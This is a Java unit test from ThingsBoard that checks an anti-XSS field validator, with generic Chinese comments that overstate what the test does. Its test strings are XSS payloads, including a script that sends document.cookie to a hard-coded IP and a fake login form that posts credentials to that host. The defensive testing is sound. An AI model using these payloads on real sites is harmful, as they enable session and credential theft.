/**
 * Copyright © 2016-2024 The Thingsboard Authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.thingsboard.server.dao.service;

import com.fasterxml.jackson.databind.node.TextNode;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.thingsboard.common.util.JacksonUtil;
import org.thingsboard.server.common.data.asset.Asset;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * 中文说明：
 * 1. 类目的：`NoXssValidatorTest` 是 ThingsBoard DAO 测试模块 中的DAO 服务测试或服务支撑类型，用于组织 DAO 层测试、共享服务夹具或持久化服务的公共执行流程。
 * 2. 所属模块：位于 dao 模块，处在 ThingsBoard 服务端的数据访问和持久化实现层。
 * 3. 协作对象：主要协作对象包括Spring Test、DAO Service、SQL/NoSQL DAO、缓存、事务管理器和测试容器。
 * 4. 生命周期：在测试套件或服务调用期间创建，负责准备上下文、执行 DAO 调用并清理状态。
 * 5. 设计原因：单独建模该类型可以隔离 DAO API、业务服务、缓存和具体数据库实现，避免上层模块直接依赖 SQL、Cassandra 或测试容器细节。
 * 6. 事务与缓存：直接或间接涉及数据库访问，事务边界通常由 Spring 服务层或测试事务管理器控制；是否触发缓存取决于实现体中的 cache、evict 或 Redis/Caffeine 调用。
 * 7. MQTT/Actor/Rule Engine：DAO 层通常不直接处理 MQTT 或 Actor 消息，但设备、遥测、规则链等数据变更会被 Transport、Actor 或 Rule Engine 间接消费。
 * 8. 设计模式：主要体现 Template Method / Service。
 */
public class NoXssValidatorTest {

    /**
     * 功能：验证 `givenEntityWithMaliciousPropertyValue_thenReturnValidationError` 描述的测试场景。
     * 参数：
     * - `maliciousString`：`maliciousString` 参数。
     * 返回：无。
     */
    @ParameterizedTest
    @ValueSource(strings = {
            "aboba<a href='a' onmouseover=alert(1337) style='font-size:500px'>666",
            "9090<body onload=alert('xsssss')>90909",
            "qwerty<script>new Image().src=\"http://192.168.149.128/bogus.php?output=\"+document.cookie;</script>yyy",
            "bambam<script>alert(document.cookie)</script>",
            "<p><a href=\"http://htmlbook.ru/example/knob.html\">Link!!!</a></p>1221",
            "<h3>Please log in to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Log in\"></br>",
            "   <img src= \"http://site.com/\"  >  ",
            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe"
    })
    public void givenEntityWithMaliciousPropertyValue_thenReturnValidationError(String maliciousString) {
        Asset invalidAsset = new Asset();
        invalidAsset.setName(maliciousString);

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

    /**
     * 功能：验证 `givenEntityWithMaliciousValueInAdditionalInfo_thenReturnValidationError` 描述的测试场景。
     * 参数：无。
     * 返回：无。
     */
    @Test
    public void givenEntityWithMaliciousValueInAdditionalInfo_thenReturnValidationError() {
        Asset invalidAsset = new Asset();
        String maliciousValue = "qwerty<script>alert(document.cookie)</script>qwerty";
        invalidAsset.setAdditionalInfo(JacksonUtil.newObjectNode()
                .set("description", new TextNode(maliciousValue)));

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

}

/*
 * 本类总结：
 * 1. 核心职责：`NoXssValidatorTest` 在 ThingsBoard DAO 测试模块 中承担DAO 服务测试或服务支撑类型职责，核心目的是组织 DAO 层测试、共享服务夹具或持久化服务的公共执行流程。
 * 2. 核心流程：初始化测试或服务依赖，执行 DAO 契约调用，最后校验数据库、缓存或事件状态。
 * 3. 关键依赖：主要依赖或协作对象包括Spring Test、DAO Service、SQL/NoSQL DAO、缓存、事务管理器和测试容器。
 * 4. 学习重点：阅读本文件时应关注租户/实体作用域、事务边界、缓存失效、SQL/NoSQL 差异、数据库异常转换，以及数据变更对 Rule Engine、Transport、Actor 和审计链路的间接影响。
 */
